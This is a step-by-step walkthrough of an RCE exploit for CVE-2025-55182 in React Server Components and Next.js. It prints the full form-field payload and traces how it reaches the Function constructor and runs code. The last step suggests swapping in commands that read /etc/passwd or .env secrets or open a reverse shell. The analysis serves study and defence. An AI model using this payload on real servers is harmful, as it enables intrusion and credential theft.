# React2Shell Payload Walkthrough (CVE-2025-55182)

A step-by-step trace showing exactly how the exploit payload transforms as it flows through the vulnerable code.

---

## The Exploit Payload (Sent as Form Fields)

```javascript
"0" = "$1"
"1" = '{"status":"resolved_model","reason":0,"_response":"$4","value":"{\"then\":\"$3:map\",\"0\":{\"then\":\"$B3\"},\"length\":1}","then":"$2:then"}'
"2" = "$@3"
"3" = "[]"
"4" = '{"_prefix":"console.log(7*7+1)//","_formData":{"get":"$3:constructor:constructor"},"_chunks":"$2:_response:_chunks"}'
```

---

## Step 1: Request Arrives

### BEFORE

```javascript
// Server state - empty
response._chunks = {}
boundActionArguments = undefined
```

### CODE

```javascript
// packages/next/src/server/app-render/action-handler.ts:879
boundActionArguments = await decodeReplyFromBusboy(
    busboy,
    serverModuleMap,
    { temporaryReferences }
)

// Inside decodeReplyFromBusboy, for each form field:
// resolveField(response, name, value) is called
```

### Explanation

The HTTP request arrives with 5 form fields. Each field is stored as a Chunk in the response object. At this point, all values are still raw strings.

### AFTER

```javascript
response._chunks = {
    0: {
        status: "resolved_model",
        value: "$1",
        reason: null,
        _response: response
    },
    1: {
        status: "resolved_model",
        value: '{"status":"resolved_model","reason":0,"_response":"$4","value":"{\\"then\\":\\"$3:map\\",\\"0\\":{\\"then\\":\\"$B3\\"},\\"length\\":1}","then":"$2:then"}',
        reason: null,
        _response: response
    },
    2: {
        status: "resolved_model",
        value: "$@3",
        reason: null,
        _response: response
    },
    3: {
        status: "resolved_model",
        value: "[]",
        reason: null,
        _response: response
    },
    4: {
        status: "resolved_model",
        value: '{"_prefix":"console.log(7*7+1)//","_formData":{"get":"$3:constructor:constructor"},"_chunks":"$2:_response:_chunks"}',
        reason: null,
        _response: response
    }
}

// decodeReplyFromBusboy returns chunk 0
boundActionArguments = response._chunks[0]
```

---

## Step 2: Chunk 0 Resolves → References Chunk 1

### BEFORE

```javascript
response._chunks = {
    0: {
        status: "resolved_model",
        value: "$1",                    // <-- Currently resolving this
        reason: null,
        _response: response
    },
    1: {
        status: "resolved_model",
        value: '{"status":"resolved_model","reason":0,"_response":"$4","value":"{\\"then\\":\\"$3:map\\",\\"0\\":{\\"then\\":\\"$B3\\"},\\"length\\":1}","then":"$2:then"}',
        reason: null,
        _response: response
    },
    2: {
        status: "resolved_model",
        value: "$@3",
        reason: null,
        _response: response
    },
    3: {
        status: "resolved_model",
        value: "[]",
        reason: null,
        _response: response
    },
    4: {
        status: "resolved_model",
        value: '{"_prefix":"console.log(7*7+1)//","_formData":{"get":"$3:constructor:constructor"},"_chunks":"$2:_response:_chunks"}',
        reason: null,
        _response: response
    }
}
```

### CODE

```javascript
// ReactFlightReplyServer.js - parseModelString
function parseModelString(response, parentObject, key, value) {
    // value = "$1"

    if (value[0] !== '$') return value;

    // value[0] = '$', so it's a reference
    // value[1] = '1', which is not a special character

    switch (value[1]) {
        default: {
            // Parse "1" as hexadecimal chunk ID
            const refId = parseInt(value.slice(1), 16);  // refId = 1
            return getOrResolveChunk(response, refId);   // Returns chunk 1
        }
    }
}
```

### Explanation

The value `"$1"` is a chunk reference. The `$` indicates it's a reference, and `1` is the chunk ID (in hex). The function returns chunk 1, which will need to be resolved next.

### AFTER

```javascript
response._chunks = {
    0: {
        status: "initialized",
        value: response._chunks[1],     // <-- Now points to chunk 1 object
        reason: null,
        _response: response
    },
    1: {
        status: "resolved_model",
        value: '{"status":"resolved_model","reason":0,"_response":"$4","value":"{\\"then\\":\\"$3:map\\",\\"0\\":{\\"then\\":\\"$B3\\"},\\"length\\":1}","then":"$2:then"}',
        reason: null,
        _response: response
    },
    2: {
        status: "resolved_model",
        value: "$@3",
        reason: null,
        _response: response
    },
    3: {
        status: "resolved_model",
        value: "[]",
        reason: null,
        _response: response
    },
    4: {
        status: "resolved_model",
        value: '{"_prefix":"console.log(7*7+1)//","_formData":{"get":"$3:constructor:constructor"},"_chunks":"$2:_response:_chunks"}',
        reason: null,
        _response: response
    }
}
```

---

## Step 3: Chunk 3 Resolves → Empty Array

### BEFORE

```javascript
response._chunks = {
    0: {
        status: "initialized",
        value: response._chunks[1],
        reason: null,
        _response: response
    },
    1: {
        status: "resolved_model",
        value: '{"status":"resolved_model","reason":0,"_response":"$4","value":"{\\"then\\":\\"$3:map\\",\\"0\\":{\\"then\\":\\"$B3\\"},\\"length\\":1}","then":"$2:then"}',
        reason: null,
        _response: response
    },
    2: {
        status: "resolved_model",
        value: "$@3",
        reason: null,
        _response: response
    },
    3: {
        status: "resolved_model",
        value: "[]",                    // <-- Currently resolving this
        reason: null,
        _response: response
    },
    4: {
        status: "resolved_model",
        value: '{"_prefix":"console.log(7*7+1)//","_formData":{"get":"$3:constructor:constructor"},"_chunks":"$2:_response:_chunks"}',
        reason: null,
        _response: response
    }
}
```

### CODE

```javascript
// The value "[]" is valid JSON, so it gets parsed
const parsed = JSON.parse("[]");  // Returns: []

// Chunk 3 is updated
chunk3.value = [];
chunk3.status = "initialized";
```

### Explanation

The string `"[]"` is valid JSON representing an empty array. After parsing, chunk 3 holds an actual JavaScript array. This array is critical because it provides access to the prototype chain.

### AFTER

```javascript
response._chunks = {
    0: {
        status: "initialized",
        value: response._chunks[1],
        reason: null,
        _response: response
    },
    1: {
        status: "resolved_model",
        value: '{"status":"resolved_model","reason":0,"_response":"$4","value":"{\\"then\\":\\"$3:map\\",\\"0\\":{\\"then\\":\\"$B3\\"},\\"length\\":1}","then":"$2:then"}',
        reason: null,
        _response: response
    },
    2: {
        status: "resolved_model",
        value: "$@3",
        reason: null,
        _response: response
    },
    3: {
        status: "initialized",          // <-- Changed from "resolved_model"
        value: [],                      // <-- Now an actual empty array!
        reason: null,
        _response: response
    },
    4: {
        status: "resolved_model",
        value: '{"_prefix":"console.log(7*7+1)//","_formData":{"get":"$3:constructor:constructor"},"_chunks":"$2:_response:_chunks"}',
        reason: null,
        _response: response
    }
}

// The prototype chain is now accessible:
// [].constructor === Array
// [].constructor.constructor === Function
```

---

## Step 4: Resolving `$3:constructor:constructor` → Gets Function

### BEFORE

```javascript
response._chunks = {
    0: {
        status: "initialized",
        value: response._chunks[1],
        reason: null,
        _response: response
    },
    1: {
        status: "resolved_model",
        value: '{"status":"resolved_model","reason":0,"_response":"$4","value":"{\\"then\\":\\"$3:map\\",\\"0\\":{\\"then\\":\\"$B3\\"},\\"length\\":1}","then":"$2:then"}',
        reason: null,
        _response: response
    },
    2: {
        status: "resolved_model",
        value: "$@3",
        reason: null,
        _response: response
    },
    3: {
        status: "initialized",
        value: [],
        reason: null,
        _response: response
    },
    4: {
        status: "resolved_model",
        value: '{"_prefix":"console.log(7*7+1)//","_formData":{"get":"$3:constructor:constructor"},"_chunks":"$2:_response:_chunks"}',
        reason: null,                   // Resolving the "get" property ^^^
        _response: response
    }
}
```

### CODE

```javascript
// ReactFlightReplyServer.js:595 - getOutlinedModel (VULNERABLE!)
function getOutlinedModel(response, reference, parentObject, key, map) {
    // reference = "3:constructor:constructor"

    const path = reference.split(':');
    // path = ["3", "constructor", "constructor"]

    const id = parseInt(path[0], 16);  // id = 3
    const chunk = getChunk(response, id);

    let value = chunk.value;  // value = []

    // VULNERABILITY: No validation on property names!
    for (let i = 1; i < path.length; i++) {
        value = value[path[i]];
    }
    // Iteration 1: value = []["constructor"] = Array
    // Iteration 2: value = Array["constructor"] = Function

    return map(response, value);  // Returns Function!
}
```

### Explanation

The reference `"$3:constructor:constructor"` means: get chunk 3, then access `.constructor`, then access `.constructor` again. Since chunk 3 is an empty array:
- `[].constructor` is `Array`
- `Array.constructor` is `Function`

The code has no validation, so it happily traverses the prototype chain.

### AFTER

```javascript
response._chunks = {
    0: {
        status: "initialized",
        value: response._chunks[1],
        reason: null,
        _response: response
    },
    1: {
        status: "resolved_model",
        value: '{"status":"resolved_model","reason":0,"_response":"$4","value":"{\\"then\\":\\"$3:map\\",\\"0\\":{\\"then\\":\\"$B3\\"},\\"length\\":1}","then":"$2:then"}',
        reason: null,
        _response: response
    },
    2: {
        status: "resolved_model",
        value: "$@3",
        reason: null,
        _response: response
    },
    3: {
        status: "initialized",
        value: [],
        reason: null,
        _response: response
    },
    4: {
        status: "initialized",          // <-- Changed from "resolved_model"
        value: {
            _prefix: "console.log(7*7+1)//",
            _formData: {
                get: Function           // <-- THE FUNCTION CONSTRUCTOR!
            },
            _chunks: "$2:_response:_chunks"  // Still needs resolution
        },
        reason: null,
        _response: response
    }
}
```

---

## Step 5: Chunk 2 Resolves → Raw Chunk Reference

### BEFORE

```javascript
response._chunks = {
    0: {
        status: "initialized",
        value: response._chunks[1],
        reason: null,
        _response: response
    },
    1: {
        status: "resolved_model",
        value: '{"status":"resolved_model","reason":0,"_response":"$4","value":"{\\"then\\":\\"$3:map\\",\\"0\\":{\\"then\\":\\"$B3\\"},\\"length\\":1}","then":"$2:then"}',
        reason: null,
        _response: response
    },
    2: {
        status: "resolved_model",
        value: "$@3",                   // <-- Currently resolving this
        reason: null,
        _response: response
    },
    3: {
        status: "initialized",
        value: [],
        reason: null,
        _response: response
    },
    4: {
        status: "initialized",
        value: {
            _prefix: "console.log(7*7+1)//",
            _formData: {
                get: Function
            },
            _chunks: "$2:_response:_chunks"
        },
        reason: null,
        _response: response
    }
}
```

### CODE

```javascript
// ReactFlightReplyServer.js - parseModelString
function parseModelString(response, parentObject, key, value) {
    // value = "$@3"

    switch (value[1]) {
        case '@': {
            // "$@" means raw chunk reference (not resolved value)
            const id = parseInt(value.slice(2), 16);  // id = 3
            const chunk = getChunk(response, id);
            return chunk;  // Returns the Chunk OBJECT itself, not chunk.value!
        }
    }
}
```

### Explanation

The `$@` prefix is special. Unlike `$3` which would return the resolved value (`[]`), `$@3` returns the Chunk object itself. This is important because the Chunk object has a `then` method from `Chunk.prototype`.

### AFTER

```javascript
response._chunks = {
    0: {
        status: "initialized",
        value: response._chunks[1],
        reason: null,
        _response: response
    },
    1: {
        status: "resolved_model",
        value: '{"status":"resolved_model","reason":0,"_response":"$4","value":"{\\"then\\":\\"$3:map\\",\\"0\\":{\\"then\\":\\"$B3\\"},\\"length\\":1}","then":"$2:then"}',
        reason: null,
        _response: response
    },
    2: {
        status: "initialized",          // <-- Changed from "resolved_model"
        value: {                        // <-- Now holds the Chunk OBJECT for chunk 3
            status: "initialized",
            value: [],
            reason: null,
            _response: response,
            // Inherited from Chunk.prototype:
            then: function(resolve, reject) { /* Chunk.prototype.then */ }
        },
        reason: null,
        _response: response
    },
    3: {
        status: "initialized",
        value: [],
        reason: null,
        _response: response
    },
    4: {
        status: "initialized",
        value: {
            _prefix: "console.log(7*7+1)//",
            _formData: {
                get: Function
            },
            _chunks: "$2:_response:_chunks"
        },
        reason: null,
        _response: response
    }
}
```

---

## Step 6: Resolving `$2:then` → Gets Chunk.prototype.then

### BEFORE

```javascript
response._chunks = {
    0: {
        status: "initialized",
        value: response._chunks[1],
        reason: null,
        _response: response
    },
    1: {
        status: "resolved_model",
        value: '{"status":"resolved_model","reason":0,"_response":"$4","value":"{\\"then\\":\\"$3:map\\",\\"0\\":{\\"then\\":\\"$B3\\"},\\"length\\":1}","then":"$2:then"}',
        reason: null,                   // Resolving the "then" property ^^^
        _response: response
    },
    2: {
        status: "initialized",
        value: {
            status: "initialized",
            value: [],
            reason: null,
            _response: response,
            then: function(resolve, reject) { /* Chunk.prototype.then */ }
        },
        reason: null,
        _response: response
    },
    3: {
        status: "initialized",
        value: [],
        reason: null,
        _response: response
    },
    4: {
        status: "initialized",
        value: {
            _prefix: "console.log(7*7+1)//",
            _formData: {
                get: Function
            },
            _chunks: "$2:_response:_chunks"
        },
        reason: null,
        _response: response
    }
}
```

### CODE

```javascript
// getOutlinedModel processes "$2:then"
const path = reference.split(':');
// path = ["2", "then"]

const id = parseInt(path[0], 16);  // id = 2
const chunk = getChunk(response, id);

let value = chunk.value;
// value = { status: "initialized", value: [], ..., then: Chunk.prototype.then }

for (let i = 1; i < path.length; i++) {
    value = value[path[i]];
}
// Iteration 1: value = chunk2.value["then"] = Chunk.prototype.then

return value;  // Returns Chunk.prototype.then!
```

### Explanation

We access the `then` property of chunk 2's value. Since chunk 2 holds a raw Chunk object (from `$@3`), and Chunk objects have a `then` method from their prototype, this returns `Chunk.prototype.then`.

### AFTER

```javascript
response._chunks = {
    0: {
        status: "initialized",
        value: response._chunks[1],
        reason: null,
        _response: response
    },
    1: {
        status: "initialized",          // <-- Changed from "resolved_model"
        value: {                        // <-- Now a parsed object
            status: "resolved_model",
            reason: 0,
            _response: "$4",            // Still needs resolution
            value: '{"then":"$3:map","0":{"then":"$B3"},"length":1}',
            then: function(resolve, reject) { /* Chunk.prototype.then */ }  // <-- GOT IT!
        },
        reason: null,
        _response: response
    },
    2: {
        status: "initialized",
        value: {
            status: "initialized",
            value: [],
            reason: null,
            _response: response,
            then: function(resolve, reject) { /* Chunk.prototype.then */ }
        },
        reason: null,
        _response: response
    },
    3: {
        status: "initialized",
        value: [],
        reason: null,
        _response: response
    },
    4: {
        status: "initialized",
        value: {
            _prefix: "console.log(7*7+1)//",
            _formData: {
                get: Function
            },
            _chunks: "$2:_response:_chunks"
        },
        reason: null,
        _response: response
    }
}
```

---

## Step 7: Resolving `$4` → Gets Fake Response

### BEFORE

```javascript
response._chunks = {
    0: {
        status: "initialized",
        value: response._chunks[1],
        reason: null,
        _response: response
    },
    1: {
        status: "initialized",
        value: {
            status: "resolved_model",
            reason: 0,
            _response: "$4",            // <-- Currently resolving this
            value: '{"then":"$3:map","0":{"then":"$B3"},"length":1}',
            then: function(resolve, reject) { /* Chunk.prototype.then */ }
        },
        reason: null,
        _response: response
    },
    2: {
        status: "initialized",
        value: {
            status: "initialized",
            value: [],
            reason: null,
            _response: response,
            then: function(resolve, reject) { /* Chunk.prototype.then */ }
        },
        reason: null,
        _response: response
    },
    3: {
        status: "initialized",
        value: [],
        reason: null,
        _response: response
    },
    4: {
        status: "initialized",
        value: {
            _prefix: "console.log(7*7+1)//",
            _formData: {
                get: Function
            },
            _chunks: "$2:_response:_chunks"
        },
        reason: null,
        _response: response
    }
}
```

### CODE

```javascript
// parseModelString processes "$4"
const refId = parseInt("4", 16);  // refId = 4
return getOrResolveChunk(response, refId);  // Returns chunk 4's value
```

### Explanation

The `_response` property resolves to chunk 4's value - the attacker's fake Response object containing the malicious code prefix and the Function constructor.

### AFTER

```javascript
response._chunks = {
    0: {
        status: "initialized",
        value: response._chunks[1],
        reason: null,
        _response: response
    },
    1: {
        status: "initialized",
        value: {
            status: "resolved_model",
            reason: 0,
            _response: {                // <-- Resolved to chunk 4's value!
                _prefix: "console.log(7*7+1)//",
                _formData: {
                    get: Function
                },
                _chunks: "$2:_response:_chunks"
            },
            value: '{"then":"$3:map","0":{"then":"$B3"},"length":1}',
            then: function(resolve, reject) { /* Chunk.prototype.then */ }
        },
        reason: null,
        _response: response
    },
    2: {
        status: "initialized",
        value: {
            status: "initialized",
            value: [],
            reason: null,
            _response: response,
            then: function(resolve, reject) { /* Chunk.prototype.then */ }
        },
        reason: null,
        _response: response
    },
    3: {
        status: "initialized",
        value: [],
        reason: null,
        _response: response
    },
    4: {
        status: "initialized",
        value: {
            _prefix: "console.log(7*7+1)//",
            _formData: {
                get: Function
            },
            _chunks: "$2:_response:_chunks"
        },
        reason: null,
        _response: response
    }
}

// Chunk 1's value is now complete and is a THENABLE (has "then" function)
```

---

## Step 8: Await Triggers Chunk.prototype.then

### BEFORE

```javascript
// The server awaits the result
await boundActionArguments

// boundActionArguments = chunk 0
// chunk 0's value = chunk 1's value
// chunk 1's value = {
//     status: "resolved_model",
//     reason: 0,
//     _response: { _prefix: "console.log(7*7+1)//", _formData: { get: Function }, _chunks: ... },
//     value: '{"then":"$3:map","0":{"then":"$B3"},"length":1}',
//     then: Chunk.prototype.then   <-- HAS A "then" FUNCTION!
// }
```

### CODE

```javascript
// JavaScript sees an object with a "then" function
// It treats it as a thenable and calls:
chunk1Value.then(resolve, reject)

// This invokes Chunk.prototype.then with "this" = chunk1Value
Chunk.prototype.then = function(resolve, reject) {
    const chunk = this;
    // chunk = {
    //     status: "resolved_model",
    //     reason: 0,
    //     _response: { _prefix: "console.log(7*7+1)//", _formData: { get: Function } },
    //     value: '{"then":"$3:map","0":{"then":"$B3"},"length":1}',
    //     then: Chunk.prototype.then
    // }

    switch (chunk.status) {
        case "resolved_model":           // This matches!
            initializeModelChunk(chunk);  // <-- CALLED WITH ATTACKER'S OBJECT
            break;
    }
};
```

### Explanation

When JavaScript `await`s an object with a `then` method, it calls that method. Here, `then` is `Chunk.prototype.then`. Because the attacker set `status: "resolved_model"`, it triggers `initializeModelChunk` - but with the attacker's fake `_response`!

### AFTER

```javascript
// initializeModelChunk is called with:
chunk = {
    status: "resolved_model",
    reason: 0,
    _response: {
        _prefix: "console.log(7*7+1)//",
        _formData: {
            get: Function
        },
        _chunks: "$2:_response:_chunks"
    },
    value: '{"then":"$3:map","0":{"then":"$B3"},"length":1}'
}

// This will parse chunk.value as JSON and resolve references using chunk._response (FAKE!)
```

---

## Step 9: initializeModelChunk Parses Nested JSON

### BEFORE

```javascript
// Inside initializeModelChunk:
chunk = {
    status: "resolved_model",
    reason: 0,
    _response: {
        _prefix: "console.log(7*7+1)//",
        _formData: {
            get: Function
        },
        _chunks: "$2:_response:_chunks"
    },
    value: '{"then":"$3:map","0":{"then":"$B3"},"length":1}'
}
```

### CODE

```javascript
// ReactFlightReplyServer.js:446 - initializeModelChunk
function initializeModelChunk(chunk) {
    const resolvedModel = chunk.value;
    // resolvedModel = '{"then":"$3:map","0":{"then":"$B3"},"length":1}'

    // Parse the JSON string
    const rawModel = JSON.parse(resolvedModel);
    // rawModel = {
    //     then: "$3:map",
    //     0: { then: "$B3" },
    //     length: 1
    // }

    // Resolve references using chunk._response
    const value = reviveModel(
        chunk._response,   // <-- ATTACKER'S FAKE RESPONSE!
        { '': rawModel },
        '',
        rawModel
    );
}
```

### Explanation

The nested JSON string is parsed, producing an object with references that need resolution. Critically, `reviveModel` uses `chunk._response` - which is the attacker's fake Response containing the Function constructor!

### AFTER

```javascript
// After JSON.parse:
rawModel = {
    then: "$3:map",           // Needs resolution
    0: {
        then: "$B3"           // Needs resolution
    },
    length: 1
}

// reviveModel will resolve these using:
fakeResponse = {
    _prefix: "console.log(7*7+1)//",
    _formData: {
        get: Function
    },
    _chunks: "$2:_response:_chunks"
}
```

---

## Step 10: Resolving `$3:map` → Gets Array.prototype.map

### BEFORE

```javascript
// Currently resolving:
rawModel = {
    then: "$3:map",           // <-- Resolving this
    0: {
        then: "$B3"
    },
    length: 1
}

// Chunk 3 contains:
chunk3 = {
    status: "initialized",
    value: [],                // Empty array
    reason: null,
    _response: response
}
```

### CODE

```javascript
// getOutlinedModel processes "$3:map"
const path = reference.split(':');
// path = ["3", "map"]

const id = parseInt(path[0], 16);  // id = 3
let value = chunks[3].value;       // value = []

for (let i = 1; i < path.length; i++) {
    value = value[path[i]];
}
// Iteration 1: value = []["map"] = Array.prototype.map

return value;  // Returns Array.prototype.map!
```

### Explanation

The path `"3:map"` means "get chunk 3's value, then access its `map` property". Arrays have a `map` method, so this returns `Array.prototype.map`.

### AFTER

```javascript
// After resolving "$3:map":
rawModel = {
    then: function map() { [native code] },  // <-- Array.prototype.map!
    0: {
        then: "$B3"           // Still needs resolution
    },
    length: 1
}

// This object is now THENABLE because "then" is a function!
// When JavaScript resolves it, it will call:
//   rawModel.then(resolve, reject)
// Which is actually:
//   Array.prototype.map.call(rawModel, resolve)
```

---

## Step 11: Outer Thenable Resolves → Array.map Iterates

### BEFORE

```javascript
// The outer object:
outerObject = {
    then: function map() { [native code] },  // Array.prototype.map
    0: {
        then: "$B3"
    },
    length: 1
}
```

### CODE

```javascript
// JavaScript sees "then" is a function, so it calls:
outerObject.then(resolveCallback, rejectCallback)

// This is actually:
Array.prototype.map.call(outerObject, resolveCallback)

// Array.map treats outerObject as array-like because it has:
// - Property "0" (element at index 0)
// - Property "length" (value: 1)

// So map iterates:
for (let i = 0; i < outerObject.length; i++) {
    const item = outerObject[i];
    // i = 0: item = { then: "$B3" }

    const result = resolveCallback(item, i, outerObject);
    // This tries to resolve { then: "$B3" } as a value
}
```

### Explanation

Since `then` is `Array.prototype.map`, calling it iterates over the object. The object has `0: {...}` and `length: 1`, so map processes one item. This item `{then: "$B3"}` needs its `then` property resolved.

### AFTER

```javascript
// Array.map found item at index 0:
innerObject = {
    then: "$B3"               // <-- Needs resolution!
}

// When "$B3" is resolved, it will use the FAKE response:
// fakeResponse._formData.get(fakeResponse._prefix + "3")
// = Function("console.log(7*7+1)//" + "3")
// = Function("console.log(7*7+1)//3")
```

---

## Step 12: Resolving `$B3` → THE RCE TRIGGER!

### BEFORE

```javascript
// Currently resolving:
innerObject = {
    then: "$B3"               // <-- Resolving this
}

// The fake response being used:
fakeResponse = {
    _prefix: "console.log(7*7+1)//",
    _formData: {
        get: Function         // The Function constructor!
    },
    _chunks: "$2:_response:_chunks"
}
```

### CODE

```javascript
// ReactFlightReplyServer.js - parseModelString
function parseModelString(response, parentObject, key, value) {
    // value = "$B3"
    // response = fakeResponse (attacker controlled!)

    switch (value[1]) {
        case 'B': {
            // "$B" = Blob reference
            const id = parseInt(value.slice(2), 16);
            // id = 3

            const prefix = response._prefix;
            // prefix = "console.log(7*7+1)//"

            const blobKey = prefix + id;
            // blobKey = "console.log(7*7+1)//" + "3"
            // blobKey = "console.log(7*7+1)//3"

            return response._formData.get(blobKey);
            // response._formData.get = Function
            //
            // This call: Function("console.log(7*7+1)//3")
            //
            // Creates: function anonymous() {
            //              console.log(7*7+1)//3
            //          }
        }
    }
}
```

### Explanation

The `$B` prefix normally looks up blob data. It constructs a key from `_prefix + id` and calls `_formData.get(key)`. But the attacker controls both:
- `_prefix` = malicious JavaScript code
- `_formData.get` = the Function constructor

So instead of looking up a blob, it calls `Function("malicious code")`, creating an executable function!

The `//` at the end comments out the appended `3`, keeping the code syntactically valid.

### AFTER

```javascript
// After resolving "$B3":
innerObject = {
    then: function anonymous() {
        console.log(7*7+1)//3
    }
}

// This object is now THENABLE because "then" is a function!
// When JavaScript resolves it, it will CALL this function!
```

---

## Step 13: Inner Thenable Resolves → CODE EXECUTION!

### BEFORE

```javascript
// The inner object:
innerObject = {
    then: function anonymous() {
        console.log(7*7+1)//3
    }
}

// JavaScript sees "then" is a function
// It will call: innerObject.then(resolve, reject)
```

### CODE

```javascript
// JavaScript Promise resolution:
innerObject.then(resolve, reject)

// This CALLS the function:
(function anonymous() {
    console.log(7*7+1)//3
})(resolve, reject)

// The function body executes:
console.log(7*7+1)    // Evaluates to console.log(50)
//3                   // This is just a comment, ignored

// Output: 50
```

### Explanation

JavaScript treats `innerObject` as a thenable and calls its `then` method. But `then` is our malicious function! It executes and runs `console.log(7*7+1)`, printing `50` to the server console.

### AFTER

```javascript
// Server console output:
// 50

// REMOTE CODE EXECUTION ACHIEVED!

// The attacker can replace "console.log(7*7+1)" with anything:
// - require('child_process').execSync('cat /etc/passwd')
// - require('fs').readFileSync('/app/.env')
// - process.env.DATABASE_PASSWORD
// - Reverse shell, data exfiltration, etc.
```

---

## Final State Summary

### All Chunks After Full Resolution

```javascript
response._chunks = {
    0: {
        status: "initialized",
        value: response._chunks[1].value,
        reason: null,
        _response: response
    },
    1: {
        status: "initialized",
        value: {
            status: "resolved_model",
            reason: 0,
            _response: {
                _prefix: "console.log(7*7+1)//",
                _formData: {
                    get: Function
                },
                _chunks: response._chunks
            },
            value: '{"then":"$3:map","0":{"then":"$B3"},"length":1}',
            then: function(resolve, reject) { /* Chunk.prototype.then */ }
        },
        reason: null,
        _response: response
    },
    2: {
        status: "initialized",
        value: response._chunks[3],  // Raw chunk 3 object
        reason: null,
        _response: response
    },
    3: {
        status: "initialized",
        value: [],
        reason: null,
        _response: response
    },
    4: {
        status: "initialized",
        value: {
            _prefix: "console.log(7*7+1)//",
            _formData: {
                get: Function
            },
            _chunks: response._chunks
        },
        reason: null,
        _response: response
    }
}
```

### The Execution Chain

```
HTTP Request with malicious form fields
    ↓
decodeReplyFromBusboy() stores chunks 0-4
    ↓
Returns chunk 0 (points to chunk 1)
    ↓
await chunk1 (which has "then" = Chunk.prototype.then)
    ↓
JavaScript calls chunk1.then(resolve, reject)
    ↓
Chunk.prototype.then sees status = "resolved_model"
    ↓
Calls initializeModelChunk(chunk1) with chunk1._response = FAKE
    ↓
Parses nested JSON: { then: "$3:map", 0: { then: "$B3" }, length: 1 }
    ↓
Resolves "$3:map" → Array.prototype.map
    ↓
Object becomes thenable, JS calls .then() = Array.map
    ↓
map() iterates, finds { then: "$B3" }
    ↓
Resolves "$B3" using FAKE response:
    FAKE._formData.get(FAKE._prefix + "3")
    = Function("console.log(7*7+1)//3")
    ↓
Creates function, object becomes thenable
    ↓
JS calls .then() = malicious function
    ↓
╔═══════════════════════════════════════╗
║  FUNCTION EXECUTES: console.log(50)   ║
║  REMOTE CODE EXECUTION ACHIEVED!      ║
╚═══════════════════════════════════════╝
```
